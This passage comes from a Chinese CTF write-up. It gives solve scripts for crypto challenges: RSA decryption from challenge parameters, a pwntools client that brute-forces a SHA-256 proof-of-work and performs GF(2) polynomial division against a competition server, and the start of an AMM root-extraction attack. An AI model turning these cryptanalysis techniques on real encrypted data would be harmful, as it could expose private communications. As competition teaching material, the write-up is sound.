</span></span><span style="display:flex;"><span>c2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> pow(c2,d2,n2)
</span></span><span style="display:flex;"><span>print(b)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n3<span style="color:#f92672">=</span><span style="color:#ae81ff">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span>
</span></span><span style="display:flex;"><span>e3<span style="color:#f92672">=</span><span style="color:#ae81ff">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span>
</span></span><span style="display:flex;"><span>x3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">16731588253866128571163910758846497670928988943944436618514118121761227689113110943465936457030051710610254169629932203082368465978112219532158626669990117160986135699541953274434781877420432743573801621</span>
</span></span><span style="display:flex;"><span>g3 <span style="color:#f92672">=</span> gcd(e3<span style="color:#f92672">*</span>x3<span style="color:#f92672">-</span>b,n3)
</span></span><span style="display:flex;"><span>p3 <span style="color:#f92672">=</span> int(gmpy2<span style="color:#f92672">.</span>iroot(g3,<span style="color:#ae81ff">6</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>q3 <span style="color:#f92672">=</span> n3 <span style="color:#f92672">//</span> (p3 <span style="color:#f92672">**</span> <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>phi3 <span style="color:#f92672">=</span> (p3 <span style="color:#f92672">**</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">*</span> (p3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>c3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span>
</span></span><span style="display:flex;"><span>d3 <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e3,phi3)
</span></span><span style="display:flex;"><span>m3 <span style="color:#f92672">=</span> pow(c3,d3,n3)
</span></span><span style="display:flex;"><span>print(n2s(int(m3)))
</span></span></code></pre></div><h2 id="强网先锋">强网先锋</h2>
<h3 id="polydiv">Polydiv</h3>
<p>远程交互打 40 关，每次给三个多项式 <code>a(x), r(x), c(x)</code>，需要求一个 <code>b(x)</code> 满足模2多项式环上 <code>a(x)b(x)+c(x)==r(x)</code>。给出的多项式都满足可以整除，做一个模2环上的多项式除法就行。</p>
<p>最后需要调整格式，高位在左低位在右。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> re <span style="color:#f92672">import</span> findall
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> log,floor
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GF2_sub</span>(n1, n2):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> n1 <span style="color:#f92672">^</span> n2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GF2_div</span>(n1, n2):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> n1
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        len1 <span style="color:#f92672">=</span> len(bin(n1))
</span></span><span style="display:flex;"><span>        len2 <span style="color:#f92672">=</span> len(bin(n2))
</span></span><span style="display:flex;"><span>        lensub <span style="color:#f92672">=</span> len1 <span style="color:#f92672">-</span> len2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> lensub <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hex(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> lensub <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hex(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> lensub <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            div <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> len1 <span style="color:#f92672">&gt;=</span> len2:
</span></span><span style="display:flex;"><span>                n1 <span style="color:#f92672">^=</span> (n2 <span style="color:#f92672">&lt;&lt;</span> (len1 <span style="color:#f92672">-</span> len2))
</span></span><span style="display:flex;"><span>                div <span style="color:#f92672">^=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (len1<span style="color:#f92672">-</span>len2))
</span></span><span style="display:flex;"><span>                len1 <span style="color:#f92672">=</span> len(bin(n1))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> div
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;182.92.161.17&#39;</span>, <span style="color:#ae81ff">31466</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>kk <span style="color:#f92672">=</span> str(s)[<span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">30</span>]
</span></span><span style="display:flex;"><span>tt <span style="color:#f92672">=</span> str(s)[<span style="color:#ae81ff">35</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>print(kk)
</span></span><span style="display:flex;"><span>print(tt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> sha256((i<span style="color:#f92672">+</span>j<span style="color:#f92672">+</span>k<span style="color:#f92672">+</span>l<span style="color:#f92672">+</span>kk)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> tt:
</span></span><span style="display:flex;"><span>                    p<span style="color:#f92672">.</span>sendline((i<span style="color:#f92672">+</span>j<span style="color:#f92672">+</span>k<span style="color:#f92672">+</span>l)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">40</span>):
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    poly <span style="color:#f92672">=</span> str(s)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>)
</span></span><span style="display:flex;"><span>    rr <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    aa <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    cc <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    print(poly)
</span></span><span style="display:flex;"><span>    print(len(poly))
</span></span><span style="display:flex;"><span>    ps <span style="color:#f92672">=</span> poly[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(ps)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ps[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">and</span> ps[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span>:
</span></span><span style="display:flex;"><span>            rr<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    ps <span style="color:#f92672">=</span> poly[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(ps)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ps[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">and</span> ps[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span>:
</span></span><span style="display:flex;"><span>            aa<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    ps <span style="color:#f92672">=</span> poly[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(ps)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ps[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">and</span> ps[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span>:
</span></span><span style="display:flex;"><span>            cc<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\d+&#34;</span>,poly[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\d+&#34;</span>,poly[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\d+&#34;</span>,poly[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> [int(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> r]
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> [int(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a]
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> [int(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> c]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">in</span> r:
</span></span><span style="display:flex;"><span>        rr<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">in</span> a:
</span></span><span style="display:flex;"><span>        aa<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">in</span> c:
</span></span><span style="display:flex;"><span>        cc<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> r:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            rr<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            aa<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> c:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            cc<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>    print(rr,aa,cc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    rp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    ap <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    cp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> rr:
</span></span><span style="display:flex;"><span>        rp <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> i
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> aa:
</span></span><span style="display:flex;"><span>        ap <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> i
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cc:
</span></span><span style="display:flex;"><span>        cp <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> i
</span></span><span style="display:flex;"><span>    print(rp,ap,cp)
</span></span><span style="display:flex;"><span>    bp <span style="color:#f92672">=</span> GF2_div(GF2_sub(rp,cp),ap)
</span></span><span style="display:flex;"><span>    print(bp)
</span></span><span style="display:flex;"><span>    sends <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    strb <span style="color:#f92672">=</span> bin(bp)[<span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(strb)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> strb[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> len(strb)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                sends <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> len(strb)<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>                sends <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;x&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                sends <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;x^</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(len(strb)<span style="color:#f92672">-</span>i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            sends <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; + &#34;</span>
</span></span><span style="display:flex;"><span>    sends <span style="color:#f92672">=</span> sends[:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>    print(sends)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(sends<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    print(p<span style="color:#f92672">.</span>recv())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(sends<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv())
</span></span></code></pre></div><h3 id="asr">ASR</h3>
<p>yafu 一直缺少组件，factordb 赏饭吃，给出一个分解，调整 yafu 参数后，分出剩余三个质数。</p>
<p>设 <code>p**2=N</code></p>
<p>用 AMM 得出模 p 的解，发现 m 过长，再代入 <code>m=mp+k*p</code> 解出模N的解，得到答案。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AMM</span>(o, r, q):
</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">----------------------------------------------------------------------------------&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Start to run Adleman-Manders-Miller Root Extraction Method&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Try to find one </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">th root of </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> modulo </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(r, o, q))
</span></span><span style="display:flex;"><span>    g <span style="color:#f92672">=</span> GF(q)
</span></span><span style="display:flex;"><span>    o <span style="color:#f92672">=</span> g(o)
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> g(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, q))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> p <span style="color:#f92672">^</span> ((q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> r) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> g(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, q))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Find p:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(p))
</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> s <span style="color:#f92672">%</span> r <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> s <span style="color:#f92672">//</span> r
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Find s:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, t:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(s, t))
</span></span><span style="display:flex;"><span>    k <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (k <span style="color:#f92672">*</span> s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> r <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        k <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    alp <span style="color:#f92672">=</span> (k <span style="color:#f92672">*</span> s <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> r
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Find alp:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(alp))
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> p <span style="color:#f92672">^</span> (r<span style="color:#f92672">**</span>(t<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> s)
</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> o <span style="color:#f92672">^</span> (r<span style="color:#f92672">*</span>alp <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> p <span style="color:#f92672">^</span> s
</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, t):
</span></span><span style="display:flex;"><span>        d <span style="color:#f92672">=</span> b <span style="color:#f92672">^</span> (r<span style="color:#f92672">^</span>(t<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>i))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> d <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[+] Calculating DLP...&#39;</span>)
</span></span><span style="display:flex;"><span>            j <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> discrete_log(a, d)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[+] Finish DLP...&#39;</span>)
</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> b <span style="color:#f92672">*</span> (c<span style="color:#f92672">^</span>r)<span style="color:#f92672">^</span>j
</span></span><span style="display:flex;"><span>        h <span style="color:#f92672">=</span> h <span style="color:#f92672">*</span> c<span style="color:#f92672">^</span>j
</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> c <span style="color:#f92672">^</span> r
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> o<span style="color:#f92672">^</span>alp <span style="color:#f92672">*</span> h
</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Finished in </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> seconds.&#34;</span><span style="color:#f92672">.</span>format(end <span style="color:#f92672">-</span> start))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Find one solution: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(result))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findAllPRoot</span>(p, e):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Start to find all the Primitive </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">th root of 1 modulo </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.&#34;</span><span style="color:#f92672">.</span>format(e, p))
</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    proot <span style="color:#f92672">=</span> set()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(proot) <span style="color:#f92672">&lt;</span> e:
</span></span><span style="display:flex;"><span>        proot<span style="color:#f92672">.</span>add(pow(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">2</span>, p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>), (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>e, p))
</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Finished in </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> seconds.&#34;</span><span style="color:#f92672">.</span>format(end <span style="color:#f92672">-</span> start))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> proot
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findAllSolutions</span>(mp, proot, cp, p):
